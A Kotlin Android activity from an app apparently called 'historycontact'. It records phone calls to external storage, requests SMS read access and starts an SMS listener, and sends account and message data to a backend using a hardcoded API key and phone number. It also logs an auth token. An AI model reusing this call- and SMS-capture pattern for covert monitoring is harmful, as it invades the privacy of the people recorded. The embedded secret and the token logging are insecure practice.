package an.xuan.tong.historycontact.ui

import an.xuan.tong.historycontact.R
import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.InformationResponse
import an.xuan.tong.historycontact.api.model.Message
import an.xuan.tong.historycontact.api.model.User
import an.xuan.tong.historycontact.realm.HistoryContactConfiguration
import an.xuan.tong.historycontact.realm.ApiCaching
import an.xuan.tong.historycontact.smsradar.Sms
import an.xuan.tong.historycontact.smsradar.SmsListener
import an.xuan.tong.historycontact.smsradar.SmsRadar
import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.util.Log
import android.view.MotionEvent
import android.widget.Toast
import com.aykuttasil.callrecord.CallRecord
import com.facebook.accountkit.Account
import com.facebook.accountkit.AccountKit
import com.facebook.accountkit.AccountKitCallback
import com.facebook.accountkit.AccountKitError
import com.google.firebase.database.DatabaseReference
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import io.realm.Realm
import kotlinx.android.synthetic.main.activity_hello_token.*
import kotlinx.android.synthetic.main.tool_bar_app.*
import retrofit2.http.GET
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap


class TokenActivity : Activity() {
    lateinit var callRecord: CallRecord
    private var mDatabase: DatabaseReference? = null

    private val mKeyAPI: String by lazy {
        // Get Value of annotation API for save cache as KEY_CACHE
        val method = ApiService::getInfomation
        val get = method.annotations.find { it is GET } as? GET
        get?.value + ""
    }

    public override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_hello_token)
        initView()
        getInformation()
        //insertSms()
    }

    override fun onResume() {
        super.onResume()
        premissonApp()
        AccountKit.getCurrentAccount(object : AccountKitCallback<Account> {
            override fun onSuccess(account: Account) {
                user_email.text = account.email
                account.phoneNumber?.let {
                    mDatabase?.child("historycontact-a5787")?.child(account.id.toString())?.setValue(User(account.id, "", account.phoneNumber.toString()))
                }
                account.email?.let {
                    mDatabase?.child("historycontact-a5787")?.child(account.id.toString())?.setValue(User(account.id, account.email?.toString(), ""))
                }

            }

            override fun onError(error: AccountKitError) {}
        })
    }

    private fun initView() {

        switchContact.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switchPhone.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switchMicrophone.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switchLocation.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        switcStorage.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.actionMasked == MotionEvent.ACTION_MOVE
        }
        switchSMS.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
            event.getActionMasked() == MotionEvent.ACTION_MOVE
        }
        log_out_button.setOnClickListener {
            AccountKit.logOut()
            stopSmsRadarService()
            stopCallService()
            finish()
        }
        toolbarImageLeft.setOnClickListener {
            onBackPressed()
        }
    }

    private fun startCallService() {
        callRecord = CallRecord.Builder(this)
                .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                .setRecordDirName("Historycontact")
                .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                .setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                .setShowSeed(true)
                .build()

        callRecord.startCallRecordService()
    }

    private fun stopCallService() {
        callRecord.stopCallReceiver()
    }

    private fun initializeSmsRadarService() {
        SmsRadar.initializeSmsRadarService(this, object : SmsListener {
            override fun onSmsSent(sms: Sms) {
                // showSmsToast(sms)
            }

            override fun onSmsReceived(sms: Sms) {
                //showSmsToast(sms)
            }
        })
    }

    private fun stopSmsRadarService() {
        SmsRadar.stopSmsRadarService(this)
    }

    private fun getInformation() {
        Repository.createService(ApiService::class.java).getInfomation("2b11k2h3foes9f0809zdn398f0fasdmkj30", "84927356834")
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(
                        { result ->
                            Log.e("test", result.toString())
                            handlerGetInformationSccess(result)
                            Log.e("antx", "token: " + convertJsonToObject(getCacheInformation()?.data).token)
                            insertSms()
                        },
                        { e ->
                            Log.e("test", e.message)
                        })
    }

    private fun insertSms() {
        val token = convertJsonToObject(getCacheInformation()?.data).token
        var hmAuthToken = hashMapOf("Authorization" to "Bearer$token")
        var acountId = convertJsonToObject(getCacheInformation()?.data).data?.id
        val mAuthToken = HashMap(hmAuthToken)
        var message=Message(3, acountId, "84927356834",
                -121212, "location", "tin nhan test", true,convertJsonToObject(getCacheInformation()?.data).data)
        acountId?.let {
            Repository.createService(ApiService::class.java, mAuthToken).insertMessage(message, "2b11k2h3foes9f0809zdn398f0fasdmkj30")
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            { result ->
                                Log.e("antx", "insertSms" + result.toString())

                            },
                            { e ->
                                Log.e("test", "insertSms error" + e.message)
                            })
        }
    }


    fun handlerGetInformationSccess(listData: InformationResponse) {
        startCallService()
        ActivityCompat.requestPermissions(this, arrayOf("android.permission.READ_SMS"), 23)
        if (ContextCompat.checkSelfPermission(baseContext, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            initializeSmsRadarService()
        }
        saveCacheInformation(listData)
    }

    private fun saveCacheInformation(listData: InformationResponse) {
        val objCache = ApiCaching(mKeyAPI, Gson().toJson(listData), System.currentTimeMillis().toString())
        val mRealm = Realm.getInstance(HistoryContactConfiguration.createBuilder().build())
        mRealm.beginTransaction()
        mRealm.insertOrUpdate(objCache)
        mRealm.commitTransaction()
        mRealm.close()
    }

    private fun convertJsonToObject(json: String?): InformationResponse {
        return Gson().fromJson(json, object : TypeToken<InformationResponse?>() {}.type)
    }

    private fun getCacheInformation(): ApiCaching? {
        val mRealm = Realm.getInstance(HistoryContactConfiguration.createBuilder().build())
        val mangaSearchObj: ApiCaching? = mRealm.where(ApiCaching::class.java).contains("apiName", mKeyAPI).findFirst()
        // clone data if don't have this line -> crash app after "mRealm.close()"
        val result = ApiCaching(mangaSearchObj?.apiName, mangaSearchObj?.data, mangaSearchObj?.updateAt)
        mRealm.close()
        return result
    }

    private fun premissonApp() {
        switchContact.isChecked = hasPermissions(Manifest.permission.GET_ACCOUNTS)
        switchSMS.isChecked = hasPermissions(Manifest.permission.RECEIVE_SMS)
        switchLocation.isChecked = hasPermissions(Manifest.permission.ACCESS_FINE_LOCATION)
        switchMicrophone.isChecked = hasPermissions(Manifest.permission.RECORD_AUDIO)
        switchPhone.isChecked = hasPermissions(Manifest.permission.READ_PHONE_STATE)
        switcStorage.isChecked = hasPermissions(Manifest.permission.WRITE_EXTERNAL_STORAGE)
    }

    fun hasPermissions(permissions: String): Boolean {
        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && this != null && permissions != null) {
            if (ActivityCompat.checkSelfPermission(this, permissions) !== PackageManager.PERMISSION_GRANTED) {
                return false
            }
        }
        return true
    }
}